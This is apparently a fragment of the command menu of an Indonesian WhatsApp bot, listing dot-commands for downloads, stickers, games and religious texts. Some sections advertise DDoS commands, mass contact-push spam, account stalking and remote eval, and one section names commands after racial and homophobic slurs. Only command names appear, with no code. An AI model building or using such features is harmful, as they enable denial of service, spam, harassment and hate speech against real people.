│  ${khasmiring}  .ᴋɪꜱᴀʜɴᴀʙɪ
│  ${khasmiring}  .Qᴜᴏᴛᴇꜱɪꜱʟᴀᴍɪ
│  ${khasmiring}  .ɴɪᴀᴛꜱʜᴏʟᴀᴛ
│  ${khasmiring}  .ʙᴀᴄᴀᴀɴꜱʜᴏʟᴀᴛ
│  ${khasmiring}  .ᴅᴏᴀʜᴀʀɪᴀɴ
│  ${khasmiring}  .ᴀʏᴀᴛᴋᴜʀꜱɪ
│  ${khasmiring}  .ᴊᴀᴅᴡᴀʟꜱʜᴏʟᴀᴛ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} T O O L S - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴛᴛꜱ
│  ${khasmiring}  .ʀᴇᴀᴅᴠᴏ
│  ${khasmiring}  .ᴡᴀʟʟᴘᴀᴘᴇʀ
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ1
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ2
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ3
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ4
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ5
│  ${khasmiring}  .ꜰʟᴀᴍɪɴɢ6
│  ${khasmiring}  .ᴋᴏᴅᴇʙᴀʜᴀꜱᴀ
│  ${khasmiring}  .ʀᴇᴍᴏᴠᴇʙɢ
│  ${khasmiring}  .ᴛʀ
│  ${khasmiring}  .ᴊᴀʀᴀᴋ
│  ${khasmiring}  .ᴏᴄʀ
│  ${khasmiring}  .ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
│  ${khasmiring}  .ɢᴇᴛ
│  ${khasmiring}  .ʏᴛᴍᴘ3
│  ${khasmiring}  .ʏᴛᴍᴘ4
│  ${khasmiring}  .ᴛɪᴋᴛᴏᴋ
│  ${khasmiring}  .ɪɢ
│  ${khasmiring}  .ꜱᴘᴏᴛɪꜰʏ
│  ${khasmiring}  .ᴍᴇᴅɪᴀꜰɪʀᴇ
│  ${khasmiring}  .ɢᴅʀɪᴠᴇ
│  ${khasmiring}  .ɢɪᴛᴄʟᴏɴᴇ
│  ${khasmiring}  .ᴛᴡɪᴛᴛᴇʀ 
│  ${khasmiring}  .ꜰʙ
│  ${khasmiring}  .ᴏʙꜰᴜꜱ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} D D O S - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴅᴏᴡɴ1
│  ${khasmiring}  .ᴅᴏᴡɴ2
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} S T I C K - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴇʀ
│  ${khasmiring}  .ᴄʟꜱ
│  ${khasmiring}  .ꜱᴍᴇᴍᴇ 
│  ${khasmiring}  .Qᴄ
│  ${khasmiring}  .ꜱᴍᴇᴛᴀ
│  ${khasmiring}  .ꜱᴛɪᴄᴋʜᴀɴᴅʜᴏʟᴅ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋꜱʜɪɴᴏʙᴜ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴄᴜᴅᴅʟᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʜɪɢʜꜰɪᴠᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴅᴀɴᴄᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴄʀɪɴɢᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʜᴀᴘᴘʏ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋɢʟᴏᴍᴘ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋꜱᴍᴜɢ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʙʟᴜꜱʜ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴀᴡᴏᴏ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴡᴀᴠᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋꜱᴍɪʟᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋꜱʟᴀᴘ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴘᴏᴋᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴡɪɴᴋ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʙᴏɴᴋ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʙᴜʟʟʏ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʏᴇᴇᴛ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʙɪᴋᴇ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴋɪꜱꜱ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʟɪᴄᴋ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴘᴀᴛ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋʜᴜɢ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴋɪʟʟ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴄʀʏ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋꜱᴘᴀɴᴋ 
│  ${khasmiring}  .ꜱᴛɪᴄᴋᴛɪᴄᴋʟᴇ 
│  ${khasmiring}  .ᴋɪʟʟ
│  ${khasmiring}  .ʜᴀɴᴅʜᴏʟᴅ
│  ${khasmiring}  .ʜɪɢʜꜰɪᴠᴇ
│  ${khasmiring}  .ᴄʀɪɴɢᴇ
│  ${khasmiring}  .ᴅᴀɴᴄᴇ
│  ${khasmiring}  .ʜᴀᴘᴘʏ
│  ${khasmiring}  .ꜱᴍᴜɢ
│  ${khasmiring}  .ɢʟᴏᴍᴘ
│  ${khasmiring}  .ᴡᴀᴠᴇ
│  ${khasmiring}  .ʙʟᴜꜱʜ 
│  ${khasmiring}  .ꜱʟᴀᴘ
│  ${khasmiring}  .ꜱᴍɪʟᴇ
│  ${khasmiring}  .ᴘᴏᴋᴇ
│  ${khasmiring}  .ɴᴏᴍ
│  ${khasmiring}  .ᴡɪɴᴋ
│  ${khasmiring}  .ʏᴇᴇᴛ
│  ${khasmiring}  .ʙɪᴛᴇ
│  ${khasmiring}  .ʙᴏɴᴋ
│  ${khasmiring}  .ʟɪᴄᴋ
│  ${khasmiring}  .ᴘᴀᴛ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} T E M P - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴛᴇᴍᴘ-ꜱᴛᴀʀᴛ 
│  ${khasmiring}  .ᴛᴇᴍᴘ-ꜱᴛᴏᴘ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} J D B O T - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴊᴀᴅɪʙᴏᴛ-ᴘᴀɪʀɪɴɢ
│  ${khasmiring}  .ᴊᴀᴅɪʙᴏᴛ-ꜱᴄᴀɴ
│  ${khasmiring}  .ꜱᴛᴀʀᴛ-ᴊᴀᴅɪʙᴏᴛ 
│  ${khasmiring}  .ꜱᴛᴏᴘ-ᴊᴀᴅɪʙᴏᴛ
│  ${khasmiring}  .ʟɪꜱᴛ-ᴊᴀᴅɪʙᴏᴛ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} O W N - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴘᴜʙʟɪᴄ
│  ${khasmiring}  .ꜱᴇʟꜰ
│  ${khasmiring}   $ 
│  ${khasmiring}   =>
│  ${khasmiring}   > 
│  ${khasmiring}  .ᴀᴅᴅᴄᴀꜱᴇ
│  ${khasmiring}  .ᴅᴇʟᴄᴀꜱᴇ
│  ${khasmiring}  .ʟɪꜱᴛᴄᴀꜱᴇ
│  ${khasmiring}  .ʀᴇꜱᴛᴀʀᴛ
│  ${khasmiring}  .ꜱᴛᴏᴘ
│  ${khasmiring}  .ʟɪꜱᴛᴄᴀꜱᴇ
│  ${khasmiring}  .ɢᴇᴛꜱᴇꜱꜱɪᴏɴ
│  ${khasmiring}  .ᴅᴇʟꜱᴇꜱꜱɪᴏɴ 
│  ${khasmiring}  .ɢᴇᴛᴄᴀꜱᴇ
│  ${khasmiring}  .ꜱᴇᴛʀᴇᴘʟʏ
│  ${khasmiring}  .ꜱᴇᴛᴍᴇɴᴜ
│  ${khasmiring}  .ɢᴇᴛꜰᴜɴᴄ
│  ${khasmiring}  .ᴅᴇʟꜰɪʟᴇ
│  ${khasmiring}  .ᴅᴇʟꜰᴏʟᴅᴇʀ
│  ${khasmiring}  .ᴀᴅᴅꜱᴄʀᴀᴘᴇ
│  ${khasmiring}  .ᴍᴜᴛᴇɢᴄ
│  ${khasmiring}  .ʙʟᴏᴄᴋ
│  ${khasmiring}  .ᴜɴʙʟᴏᴄᴋ
│  ${khasmiring}  .ꜱᴇᴛᴘᴘʙᴏᴛ
│  ${khasmiring}  .ᴅᴇʟᴘᴘʙᴏᴛ
│  ${khasmiring}  .ꜱᴇᴛʙɪᴏʙᴏᴛ
│  ${khasmiring}  .ᴊᴏɪɴ
│  ${khasmiring}  .ᴀᴅᴅᴏᴡɴᴇʀ
│  ${khasmiring}  .ᴅᴇʟᴏᴡɴᴇʀ
│  ${khasmiring}  .ᴀᴅᴅᴘʀᴇᴍ
│  ${khasmiring}  .ᴅᴇʟᴘʀᴇᴍ
│  ${khasmiring}  .ʟɪꜱᴛᴘʀᴇᴍ
│  ${khasmiring}  .ʀᴇᴀᴅᴄʜᴀɴɢᴇ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} P R M B O N - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴀʀᴛɪɴᴀᴍᴀ 
│  ${khasmiring}  .ᴀʀᴛɪᴍɪᴍᴘɪ 
│  ${khasmiring}  .ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ 
│  ${khasmiring}  .ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ 
│  ${khasmiring}  .ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ 
│  ${khasmiring}  .ʀᴇᴊᴇᴋɪ 
│  ${khasmiring}  .ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ 
│  ${khasmiring}  .ᴘᴇᴋᴇʀᴊᴀᴀɴ 
│  ${khasmiring}  .ᴀʀᴛɪᴛᴀʀᴏᴛ 
│  ${khasmiring}  .ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ 
│  ${khasmiring}  .ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ 
│  ${khasmiring}  .ʜᴀʀɪꜱᴀɴɢᴀʀ 
│  ${khasmiring}  .ʜᴀʀɪʙᴀɪᴋ 
│  ${khasmiring}  .ꜰᴇɴɢꜱʜᴜɪ 
│  ${khasmiring}  .ɴᴀɢᴀʜᴀʀɪ
│  ${khasmiring}  .ʜᴀʀɪɴᴀᴀꜱ 
│  ${khasmiring}  .ᴡᴇᴛᴏɴ 
│  ${khasmiring}  .ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ 
│  ${khasmiring}  .ᴀʀᴀʜʀᴇᴊᴇᴋɪ 
│  ${khasmiring}  .ꜱɪꜰᴀᴛ 
│  ${khasmiring}  .ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ 
│  ${khasmiring}  .ᴍᴇᴍᴀɴᴄɪɴɢ 
│  ${khasmiring}  .ᴍᴀꜱᴀꜱᴜʙᴜʀ 
│  ${khasmiring}  .ᴢᴏᴅɪᴀᴋ 
│  ${khasmiring}  .ꜱʜɪᴏ 
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} F U N - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴄᴇᴋᴋʜᴏᴅᴀᴍ
│  ${khasmiring}  .ʙɪꜱᴀᴋᴀʜ
│  ${khasmiring}  .ɢɪᴍᴀɴᴀ
│  ${khasmiring}  .ᴀᴘᴀᴋᴀʜ
│  ${khasmiring}  .ᴋᴀᴘᴀɴᴋᴀʜ
│  ${khasmiring}  .ᴡᴀᴛᴀᴋᴄᴇᴋ
│  ${khasmiring}  .ʜᴏʙʙʏᴄᴇᴋ
│  ${khasmiring}  .ᴄᴇᴋᴍᴇᴋɪ
│  ${khasmiring}  .ᴄᴇʙᴇʟᴀᴘᴀɪᴍᴜᴛᴄɪᴀᴋᴜ
│  ${khasmiring}  .ᴄᴇᴋᴍᴇ
│  ${khasmiring}  .ᴄᴇᴋᴋᴏɴᴛᴏʟ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} R P G - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜱᴘɪɴ
│  ${khasmiring}  .ʙᴇʀʙᴜʀᴜ
│  ${khasmiring}  .ᴍɪɴɪɴɢ
│  ${khasmiring}  .ɢʟᴏʙᴀʟ
│  ${khasmiring}  .ᴜꜱᴇ-ᴘᴏᴡᴇʀ
│  ${khasmiring}  .ꜱᴇʟʟ
│  ${khasmiring}  .ɪɴᴠᴇɴᴛᴏʀʏ
│  ${khasmiring}  .ʙᴜʏ
│  ${khasmiring}  .ᴘʀᴏꜰɪʟᴇ
│  ${khasmiring}  .ᴊᴏɪɴʀᴘɢ
│  ${khasmiring}  .ᴇxɪᴛʀᴘɢ
│  ${khasmiring}  .ᴄʀᴇᴀᴛᴇɢᴜɪʟᴅ
│  ${khasmiring}  .ʟɪꜱᴛɢᴜɪʟᴅ
│  ${khasmiring}  .ᴊᴏɪɴɢᴜɪʟᴅ
│  ${khasmiring}  .ᴅᴇʟɢᴜɪʟᴅ
│  ${khasmiring}  .ɢᴜɪʟᴅɪɴꜰᴏ
│  ${khasmiring}  .ᴍʏɢᴜɪʟᴅ
│  ${khasmiring}  .ʙᴀᴛᴛʟᴇ *<628xxx>*
│  ${khasmiring}  .ᴀᴄᴄ-ʙᴀᴛᴛʟᴇ
│  ${khasmiring}  .ʀᴇᴊᴇᴄ-ʙᴀᴛᴛʟᴇ
│  ${khasmiring}  .ʟᴜᴄᴋʏᴅᴀʏ
│  ${khasmiring}  .ᴅᴀɪʟʏ
│  ${khasmiring}  .ᴡᴇᴇᴋʟʏ
│  ${khasmiring}  .ʏᴇᴀʀʟʏ
│  ${khasmiring}  .ᴍᴀɴᴄɪɴɢ
│  ${khasmiring}  .ꜱᴇᴛɴᴀᴍᴇ
│  ${khasmiring}  .ɢɪᴠᴇ-ꜰᴏᴏᴅ
│  ${khasmiring}  .ʀᴇᴄᴏᴠᴇʀ
│  ${khasmiring}  .ꜱʟᴇᴇᴘ
│  ${khasmiring}  .ʙᴇʀᴍᴀɪɴ
│  ${khasmiring}  .ʟᴀᴛɪʜ-ᴅɪɢɪᴍᴏɴ
│  ${khasmiring}  .ᴍʏᴅɪɢɪ
│  ${khasmiring}  .ᴄʜᴇᴀᴛ
│  ${khasmiring}  .ᴄᴀʀɪ-ʀᴘɢ
│  ${khasmiring}  .ᴍᴜꜱᴜʜ
│  ${khasmiring}  .ᴍᴜʟᴜɴɢ
│  ${khasmiring}  .ʜᴀᴜʟɪɴɢ
│  ${khasmiring}  .ᴋᴜʀɪʀ
│  ${khasmiring}  .ɢᴇᴛᴅɪɢɪ
│  ${khasmiring}  .ʟᴀᴍᴀʀ-ᴋᴇʀᴊᴀ
│  ${khasmiring}  .ᴏᴜᴛ-ᴋᴇʀᴊᴀ
│  ${khasmiring}  .ᴘᴏʟɪꜱɪ
│  ${khasmiring}  .ᴏᴊᴇᴋ
│  ${khasmiring}  .ᴅᴏᴋᴛᴇʀ
│  ${khasmiring}  .ᴘᴇᴛᴀɴɪ
│  ${khasmiring}  .ᴘᴇɴᴅᴀɢᴀɴɢ
│  ${khasmiring}  .ʟɪꜱᴛ-ꜱᴋɪʟ
│  ${khasmiring}  .ᴅ-ᴛᴇʀᴍɪɴᴀʟ
│  ${khasmiring}  .ᴅ3
│  ${khasmiring}  .ʀᴜʟᴇꜱ-ʀᴘɢ
│  ${khasmiring}  .ɢᴜɪᴅᴇ-ʀᴘɢ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} P U S H - M E N U ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴄᴇᴋɪᴅɢᴄ
│  ${khasmiring}  .ʟɪꜱᴛɢʀᴏᴜᴘ
│  ${khasmiring}  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ1
│  ${khasmiring}  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ2
│  ${khasmiring}  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ3
│  ${khasmiring}  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ4
│  ${khasmiring}  .ꜱᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1
│  ${khasmiring}  .ꜱᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│  ${khasmiring}  .ɢᴇᴛᴄᴏɴᴛᴀᴄᴛ
│  ${khasmiring}  .ꜱᴇɴᴅᴋᴏɴᴛᴀᴋ
│  ${khasmiring}  .ᴊᴘᴍ
│  ${khasmiring}  .ʙᴄɢᴄ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} S E T - C M D ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ꜱᴇᴛᴄᴍᴅ
│  ${khasmiring}  .ᴅᴇʟᴄᴍᴅ
│  ${khasmiring}  .ʟɪꜱᴛᴄᴍᴅ
│  ${khasmiring}  .ᴀᴅᴅᴘᴅꜰ
│  ${khasmiring}  .ᴅᴇʟᴘᴅꜰ
│  ${khasmiring}  .ʟɪꜱᴛᴘᴅꜰ
│  ${khasmiring}  .ʏᴏᴘᴅꜰ
│  ${khasmiring}  .ꜱᴇɴᴅᴘᴅꜰ
│  ${khasmiring}  .ᴀᴅᴅᴢɪᴘ
│  ${khasmiring}  .ᴅᴇʟᴢɪᴘ
│  ${khasmiring}  .ʟɪꜱᴛᴢɪᴘ
│  ${khasmiring}  .ʏᴏᴢɪᴘ
│  ${khasmiring}  .ꜱᴇɴᴅᴢɪᴘ
│  ${khasmiring}  .ᴀᴅᴅᴀᴘᴋ
│  ${khasmiring}  .ᴅᴇʟᴀᴘᴋ
│  ${khasmiring}  .ʟɪꜱᴛᴀᴘᴋ
│  ${khasmiring}  .ʏᴏᴀᴘᴋ
│  ${khasmiring}  .ꜱᴇɴᴅᴀᴘᴋ
│  ${khasmiring}  .ᴀᴅᴅᴠɴ
│  ${khasmiring}  .ᴅᴇʟᴠɴ
│  ${khasmiring}  .ʟɪꜱᴛᴠɴ
│  ${khasmiring}  .ᴀᴅᴅᴍꜱɢ
│  ${khasmiring}  .ꜱᴇɴᴅʟɪꜱᴛ
│  ${khasmiring}  .ʟɪꜱᴛᴍꜱɢ
│  ${khasmiring}  .ᴅᴇʟᴍꜱɢ
│  ${khasmiring}  .ɢᴇᴛᴍꜱɢ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} A N T I L K ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴀɴᴛɪᴡᴀᴍᴇ
│  ${khasmiring}  .ᴀɴᴛɪᴀꜱɪɴɢ
│  ${khasmiring}  .ᴀɴᴛɪᴠɪʀᴛᴇx
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋᴀʟʟ
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋꜰʙ
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋʏᴛ
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋʏᴛᴄʜ
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋɪɢ 
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋᴛᴇʟᴇ
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋᴛɪᴋᴛᴏᴋ
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋᴛᴡɪᴛᴛᴇʀ
│  ${khasmiring}  .ᴀɴᴛɪʟɪɴᴋɢᴄ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} K I D D I N G ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴛᴏʟᴏʟ
│  ${khasmiring}  .ɢᴀɢᴜɴᴀ
│  ${khasmiring}  .ᴊᴏᴍᴏᴋ
│  ${khasmiring}  .ɪᴅɪᴏᴛ
│  ${khasmiring}  .ɢᴀʏ
│  ${khasmiring}  .ʟᴇꜱʙɪ
│  ${khasmiring}  .ᴀɴᴊɪɴᴋ
│  ${khasmiring}  .ʙᴀʙɪ
│  ${khasmiring}  .ᴋᴜᴄɪɴɢ
│  ${khasmiring}  .ʙᴇʙᴀɴ
│  ${khasmiring}  .ʙᴇʙᴀɴᴋᴇʟᴜᴀʀɢᴀ
│  ${khasmiring}  .ɢᴀᴅᴀᴋᴇʟᴜᴀʀɢᴀ
│  ${khasmiring}  .ᴍɪꜱᴋɪɴ
│  ${khasmiring}  .ꜱᴀᴍᴘᴀʜ
│  ${khasmiring}  .ᴡɪʙᴜ
│  ${khasmiring}  .ᴄᴀɴᴛɪᴋ
│  ${khasmiring}  .ɢᴀɴᴛᴇɴɢ
│  ${khasmiring}  .ᴛᴀᴍᴘᴀɴ
│  ${khasmiring}  .ᴄᴜᴛᴇ
│  ${khasmiring}  .ᴋɪɴᴅ
│  ${khasmiring}  .ɪꜱʟᴀᴍ
│  ${khasmiring}  .ᴋʀɪꜱᴛᴇɴ
│  ${khasmiring}  .ʜɪɴᴅᴜ
│  ${khasmiring}  .ᴋᴀᴛᴏʟɪᴋ
│  ${khasmiring}  .ɢᴀɴᴅᴜ
│  ${khasmiring}  .ᴍᴀᴅᴀʀᴄʜᴏᴅ
│  ${khasmiring}  .ᴋᴀʟᴀ
│  ${khasmiring}  .ɢᴏʀᴀ
│  ${khasmiring}  .ᴄʜᴜᴛɪʏᴀ
│  ${khasmiring}  .ɴɪʙʙᴀ
│  ${khasmiring}  .ɴɪʙʙɪ
│  ${khasmiring}  .ʙʜᴏꜱᴅɪᴡᴀʟᴀ
│  ${khasmiring}  .ᴄʜᴜᴛᴍᴀʀɪᴋᴀ
│  ${khasmiring}  .ʙᴏᴋᴀᴄʜᴏᴅᴀ
│  ${khasmiring}  .ꜱᴜᴀʀᴇʀʙᴀᴄᴄʜᴀ
│  ${khasmiring}  .ʙᴏʟᴏᴄʜᴏᴅᴀ
│  ${khasmiring}  .ᴍᴜᴛʜᴀʟ
│  ${khasmiring}  .ᴍᴜᴛʜʙᴀᴀᴢ
│  ${khasmiring}  .ʀᴀɴᴅɪʙᴀᴀᴢ
│  ${khasmiring}  .ᴛᴏᴘɪʙᴀᴀᴢ
│  ${khasmiring}  .ᴄᴜɴᴛ
│  ${khasmiring}  .ɴᴇʀᴅ
│  ${khasmiring}  .ʙᴇʜᴇɴᴄʜᴏᴅ
│  ${khasmiring}  .ʙᴇʜɴᴄʜᴏᴅᴀ
│  ${khasmiring}  .ʙʜᴏꜱᴅɪᴋᴀ
│  ${khasmiring}  .ɴᴇʀᴅ
│  ${khasmiring}  .ᴍᴄ
│  ${khasmiring}  .ʙꜱᴅᴋ
│  ${khasmiring}  .ʙʜᴏꜱᴅᴋ
│  ${khasmiring}  .ɴɪɢɢᴇʀ
│  ${khasmiring}  .ʟᴏᴅᴀ
│  ${khasmiring}  .ʟᴀᴜɴᴅ
│  ${khasmiring}  .ɴɪɢɢᴀ
│  ${khasmiring}  .ɴᴏᴏʙʀᴀ
│  ${khasmiring}  .ᴛʜᴀʀᴋɪ
│  ${khasmiring}  .ɴɪʙʙᴀ
│  ${khasmiring}  .ɴɪʙʙɪ
│  ${khasmiring}  .ᴍᴜᴍᴜ
│  ${khasmiring}  .ʀᴀꜱᴄᴀʟ
│  ${khasmiring}  .ꜱᴄᴜᴍʙᴀɢ
│  ${khasmiring}  .ɴᴜᴛꜱ
│  ${khasmiring}  .ᴄᴏᴍʀᴀᴅᴇ
│  ${khasmiring}  .ꜰᴀɢᴏᴛ
│  ${khasmiring}  .ꜱᴄᴏᴜɴᴅʀᴇʟ
│  ${khasmiring}  .ᴅɪᴛᴄʜ
│  ${khasmiring}  .ᴅᴏᴘᴇ
│  ${khasmiring}  .ɢᴜᴄᴄɪ
│  ${khasmiring}  .ʟɪᴛ
│  ${khasmiring}  .ᴅᴜᴍʙᴀꜱꜱ
│  ${khasmiring}  .ᴄʀᴀᴄᴋʜᴇᴀᴅ
│  ${khasmiring}  .ᴍꜰ
│  ${khasmiring}  .ᴅᴏɢʟᴀ
│  ${khasmiring}  .ʙᴇᴡᴅᴀ
│  ${khasmiring}  .ʙᴏᴋᴀ
│  ${khasmiring}  .ᴋʜᴀɴᴋɪ
│  ${khasmiring}  .ʙᴀʟ 
│  ${khasmiring}  .ꜱᴜᴄᴋᴇʀ
│  ${khasmiring}  .ꜰᴜᴄᴋʙᴏʏ
│  ${khasmiring}  .ᴘʟᴀʏʙᴏʏ
│  ${khasmiring}  .ᴘʟᴀʏɢɪʀʟ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} S T A L K ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴛɪᴋᴛᴏᴋꜱᴛᴀʟᴋ
│  ${khasmiring}  .ɢʜꜱᴛᴀʟᴋ
│  ${khasmiring}  .ɴᴘᴍꜱᴛᴀʟᴋ
│  ${khasmiring}  .ɪɢꜱᴛᴀʟᴋ
╰┈────────────────•

╭┈──────────────────
│ *${m2}${khasatas1} C R P N - T P E ‎${khasatas2}${m2}*
╭┈──────────────────
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴀɴᴀᴋ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴅᴀᴇʀᴀʜ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀɪɴɢɢʀɪꜱ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴊᴀᴡᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀꜱᴜɴᴅᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʙᴜᴅᴀʏᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀɪꜱʟᴀᴍɪ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀᴘᴇʀᴛᴀᴍᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀʀᴏᴍᴀɴᴛɪꜱ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴅɪʜ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇɢɪᴛɪɢᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴊᴀᴛɪ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ɢᴀʟᴀᴜ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ɢᴏᴋɪʟ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴊᴇᴘᴀɴɢ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴋᴇʜɪᴅᴜᴘᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴋᴇʟᴜᴀʀɢᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴋɪꜱᴀʜɴʏᴀᴛᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴋᴏʀᴇᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴋʀɪꜱᴛᴇɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ʟɪʙᴜʀᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴍᴀʟᴀʏꜱɪᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴍᴇɴɢʜᴀʀᴜᴋᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴍɪꜱᴛᴇʀɪ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴍᴏᴛɪᴠᴀꜱɪ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ɴᴀꜱɪʜᴀᴛ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴏʟᴀʜʀᴀɢᴀ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴘᴀᴛᴀʜʜᴀᴛɪ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴘᴇɴᴀɴᴛɪᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴘᴇɴᴅɪᴅɪᴋᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴀʟᴀᴍᴀɴ
│  ${khasmiring}  .ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴏʀʙᴀɴᴀɴ
